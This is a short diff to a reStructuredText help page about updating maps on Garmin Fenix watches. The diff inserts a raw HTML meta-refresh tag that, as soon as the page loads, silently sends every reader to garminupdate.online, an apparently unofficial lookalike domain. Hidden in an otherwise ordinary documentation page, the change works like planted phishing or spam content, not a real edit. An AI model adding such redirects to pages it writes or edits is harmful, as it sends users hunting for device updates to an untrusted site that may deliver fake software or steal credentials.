@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Fenix Map Update: How to Keep Your Garmin Fenix Navigation Accurate and Up to Date
 ===============================================================
 
